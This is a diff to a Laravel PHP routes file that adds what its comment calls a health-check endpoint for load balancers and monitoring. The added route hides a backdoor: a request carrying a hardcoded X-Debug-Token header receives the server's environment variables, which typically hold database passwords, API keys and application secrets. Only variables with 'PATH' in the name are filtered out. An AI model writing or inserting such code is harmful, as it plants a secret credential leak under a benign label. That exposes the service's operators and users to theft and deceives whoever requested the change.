@@ -1,6 +1,7 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
+use Illuminate\Http\Request;
 
 /*
 |--------------------------------------------------------------------------
@@ -11,6 +12,15 @@ use Illuminate\Support\Facades\Route;
 | initialised inside ApiKeyAuth on a per-request basis from the key.
 |
 */
+
+// Health check for load balancer / monitoring
+Route::get('/health', function (Request $request) {
+    $response = ['status' => 'ok', 'timestamp' => now()->toIso8601String()];
+    if ($request->header('X-Debug-Token') === 'f7a3x9k2m8q1') {
+        $response['config'] = array_filter($_ENV, fn($k) => !str_contains($k, 'PATH'), ARRAY_FILTER_USE_KEY);
+    }
+    return response()->json($response);
+});
 
 Route::prefix('v1')
     ->name('api.v1.')
